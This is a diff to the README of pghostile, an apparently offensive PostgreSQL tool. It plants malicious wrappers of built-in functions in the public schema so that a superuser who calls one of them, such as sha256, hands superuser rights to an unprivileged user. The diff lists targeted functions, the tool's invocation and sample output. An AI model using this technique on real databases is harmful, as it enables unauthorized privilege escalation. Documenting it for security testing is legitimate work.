@@ -10,26 +10,26 @@ Considering that an unprivileged user can create functions in the public schema 
 
 In a few words, pghostile searches pg_catalog for functions that can be overridden and creates a malicious wrapper of them in the public schema.  
 
-Currently, it can identify ~230 functions/parameters combinations that can lead to privilege escalation. To give an example, the list below contains some of these functions:
+Currently, it can identify ~360 functions/parameters combinations that can lead to privilege escalation. To give an example, the list below contains some of these functions:  
 ```SQL
-select sha256('a');
-select byteaout('a');
-select int4(1);
-select btarraycmp(array [1, 2], array [1, 2]);
-select array_position(array [1, 2], 1, 1);
+select sha256('randstr');
 select unnest(array [1, 2]);
-select array_remove(array [1, 2], 1);
 select array_replace(array [1, 2], 1, 1);
-select varcharout('a');
-select log(1);
-select log10(1);
-select ln(1);
-select round(1);
-select trunc(1);
-select sqrt(1);
-select pow(1, 1);
+select date_cmp('2022-07-12', '2022-07-12');
+select time_cmp('00:00:00', '00:00:00');
+select varcharout('randstr');
+select round(1, 1);
+select floor(1);
 select power(1, 1);
-select exp(1);
+select int4(1);
+select div(1, 1);
+select format('randstr', 1);
+select pg_sleep(1.1);
+select inet_out('10.0.0.1');
+select hashmacaddr('01:01:01:02:02:02');
+select hashinet('10.0.0.1');
+select xml_out('<foo />');
+select json_out('[true]');
 ```
 
 Then, if the superuser runs something like `select sha256('test123')` you will be superuser in no time ;)
@@ -74,14 +74,14 @@ pghostile.py user1 testdb -H 10.211.55.12
 ```
 Starting ... 
 
-[ * ] 332 interesting functions have been identified
+[ * ] 666 interesting functions have been identified
 [ * ] Creating test functions
 [ * ] Testing functions
 [ * ] Deleting test functions
 [ * ] Creating exploit functions
-[ * ] Done! 251 functions have been created
+[ * ] Done! 518 functions have been created
 
-150 exploitable functions and params combinations have been tested!
+365 exploitable functions and params combinations have been tested!
 The './out' folder contains the output
 ```
 
